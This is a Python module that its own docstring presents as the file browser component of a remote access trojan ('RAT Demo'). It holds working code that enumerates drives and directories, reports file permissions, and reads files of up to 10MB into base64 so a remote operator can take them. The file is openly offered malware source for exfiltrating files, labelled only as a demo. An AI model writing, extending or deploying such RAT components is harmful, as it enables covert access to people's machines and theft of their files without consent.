"""
File Browser Module for RAT Demo
Provides remote file system access functionality
"""

import os
import stat
import base64
import json
from datetime import datetime
from typing import Dict, List, Any, Optional

class FileBrowser:
    """Handles file system operations for remote access"""
    
    def __init__(self):
        """Initialize file browser"""
        self.max_file_size = 10 * 1024 * 1024  # 10MB limit for downloads
        
    def list_directory(self, path: str = None) -> Dict[str, Any]:
        """
        List contents of a directory
        Args:
            path: Directory path to list (None for current directory)
        Returns:
            Dict containing directory listing and metadata
        """
        try:
            if path is None:
                path = os.getcwd()
            elif not os.path.isabs(path):
                path = os.path.abspath(path)
            
            if not os.path.exists(path):
                return {
                    "success": False,
                    "error": f"Path does not exist: {path}",
                    "path": path
                }
            
            if not os.path.isdir(path):
                return {
                    "success": False,
                    "error": f"Path is not a directory: {path}",
                    "path": path
                }
            
            items = []
            
            try:
                # Get directory contents
                for item_name in os.listdir(path):
                    item_path = os.path.join(path, item_name)
                    
                    try:
                        item_stat = os.stat(item_path)
                        
                        # Determine item type
                        if os.path.isdir(item_path):
                            item_type = "directory"
                        elif os.path.isfile(item_path):
                            item_type = "file"
                        else:
                            item_type = "other"
                        
                        # Get size and timestamps
                        size = item_stat.st_size if item_type == "file" else 0
                        modified_time = datetime.fromtimestamp(item_stat.st_mtime).isoformat()
                        
                        # Check permissions
                        readable = os.access(item_path, os.R_OK)
                        writable = os.access(item_path, os.W_OK)
                        executable = os.access(item_path, os.X_OK)
                        
                        items.append({
                            "name": item_name,
                            "path": item_path,
                            "type": item_type,
                            "size": size,
                            "size_formatted": self._format_size(size),
                            "modified": modified_time,
                            "permissions": {
                                "readable": readable,
                                "writable": writable,
                                "executable": executable
                            }
                        })
                        
                    except (OSError, PermissionError) as e:
                        # Add inaccessible item with error info
                        items.append({
                            "name": item_name,
                            "path": item_path,
                            "type": "error",
                            "size": 0,
                            "size_formatted": "N/A",
                            "modified": "N/A",
                            "error": str(e),
                            "permissions": {
                                "readable": False,
                                "writable": False,
                                "executable": False
                            }
                        })
                
                # Sort items: directories first, then files, alphabetically
                items.sort(key=lambda x: (x["type"] != "directory", x["name"].lower()))
                
                # Get parent directory
                parent_path = os.path.dirname(path) if path != os.path.dirname(path) else None
                
                return {
                    "success": True,
                    "path": path,
                    "parent_path": parent_path,
                    "items": items,
                    "total_items": len(items),
                    "timestamp": datetime.now().isoformat()
                }
                
            except PermissionError:
                return {
                    "success": False,
                    "error": f"Permission denied accessing directory: {path}",
                    "path": path
                }
                
        except Exception as e:
            return {
                "success": False,
                "error": f"Error listing directory: {str(e)}",
                "path": path or "unknown"
            }
    
    def get_file_info(self, file_path: str) -> Dict[str, Any]:
        """
        Get detailed information about a file
        Args:
            file_path: Path to the file
        Returns:
            Dict containing file information
        """
        try:
            if not os.path.exists(file_path):
                return {
                    "success": False,
                    "error": f"File does not exist: {file_path}",
                    "path": file_path
                }
            
            file_stat = os.stat(file_path)
            
            return {
                "success": True,
                "path": file_path,
                "name": os.path.basename(file_path),
                "size": file_stat.st_size,
                "size_formatted": self._format_size(file_stat.st_size),
                "type": "directory" if os.path.isdir(file_path) else "file",
                "created": datetime.fromtimestamp(file_stat.st_ctime).isoformat(),
                "modified": datetime.fromtimestamp(file_stat.st_mtime).isoformat(),
                "accessed": datetime.fromtimestamp(file_stat.st_atime).isoformat(),
                "permissions": {
                    "readable": os.access(file_path, os.R_OK),
                    "writable": os.access(file_path, os.W_OK),
                    "executable": os.access(file_path, os.X_OK)
                },
                "is_downloadable": self._is_downloadable(file_path)
            }
            
        except Exception as e:
            return {
                "success": False,
                "error": f"Error getting file info: {str(e)}",
                "path": file_path
            }
    
    def download_file(self, file_path: str) -> Dict[str, Any]:
        """
        Download a file (encode as base64)
        Args:
            file_path: Path to the file to download
        Returns:
            Dict containing file data or error
        """
        try:
            if not os.path.exists(file_path):
                return {
                    "success": False,
                    "error": f"File does not exist: {file_path}",
                    "path": file_path
                }
            
            if not os.path.isfile(file_path):
                return {
                    "success": False,
                    "error": f"Path is not a file: {file_path}",
                    "path": file_path
                }
            
            if not os.access(file_path, os.R_OK):
                return {
                    "success": False,
                    "error": f"Permission denied reading file: {file_path}",
                    "path": file_path
                }
            
            file_size = os.path.getsize(file_path)
            if file_size > self.max_file_size:
                return {
                    "success": False,
                    "error": f"File too large (max {self._format_size(self.max_file_size)}): {self._format_size(file_size)}",
                    "path": file_path
                }
            
            # Read and encode file
            with open(file_path, "rb") as f:
                file_data = f.read()
                encoded_data = base64.b64encode(file_data).decode('utf-8')
            
            return {
                "success": True,
                "path": file_path,
                "filename": os.path.basename(file_path),
                "size": file_size,
                "size_formatted": self._format_size(file_size),
                "data": encoded_data,
                "timestamp": datetime.now().isoformat()
            }
            
        except Exception as e:
            return {
                "success": False,
                "error": f"Error downloading file: {str(e)}",
                "path": file_path
            }
    
    def get_drives(self) -> Dict[str, Any]:
        """
        Get available drives (Windows specific)
        Returns:
            Dict containing drive information
        """
        try:
            drives = []
            
            if os.name == 'nt':  # Windows
                import string
                for drive_letter in string.ascii_uppercase:
                    drive_path = f"{drive_letter}:\\"
                    if os.path.exists(drive_path):
                        try:
                            # Get drive info
                            stat_result = os.statvfs(drive_path) if hasattr(os, 'statvfs') else None
                            
                            drives.append({
                                "letter": drive_letter,
                                "path": drive_path,
                                "accessible": os.access(drive_path, os.R_OK)
                            })
                        except:
                            drives.append({
                                "letter": drive_letter,
                                "path": drive_path,
                                "accessible": False
                            })
            else:  # Unix-like systems
                drives = [{
                    "letter": "/",
                    "path": "/",
                    "accessible": os.access("/", os.R_OK)
                }]
            
            return {
                "success": True,
                "drives": drives,
                "timestamp": datetime.now().isoformat()
            }
            
        except Exception as e:
            return {
                "success": False,
                "error": f"Error getting drives: {str(e)}"
            }
    
    def _format_size(self, size_bytes: int) -> str:
        """Format file size in human readable format"""
        if size_bytes == 0:
            return "0 B"
        
        size_names = ["B", "KB", "MB", "GB", "TB"]
        i = 0
        while size_bytes >= 1024.0 and i < len(size_names) - 1:
            size_bytes /= 1024.0
            i += 1
        
        return f"{size_bytes:.1f} {size_names[i]}"
    
    def _is_downloadable(self, file_path: str) -> bool:
        """Check if file can be downloaded"""
        try:
            if not os.path.isfile(file_path):
                return False
            if not os.access(file_path, os.R_OK):
                return False
            if os.path.getsize(file_path) > self.max_file_size:
                return False
            return True
        except:
            return False


# Global instance
_file_browser_instance: Optional[FileBrowser] = None

def get_file_browser() -> FileBrowser:
    """Get or create global file browser instance"""
    global _file_browser_instance
    if _file_browser_instance is None:
        _file_browser_instance = FileBrowser()
    return _file_browser_instance


# Compatibility functions
def list_directory(path: str = None) -> Dict[str, Any]:
    """List directory contents"""
    return get_file_browser().list_directory(path)

def download_file(file_path: str) -> Dict[str, Any]:
    """Download file"""
    return get_file_browser().download_file(file_path) 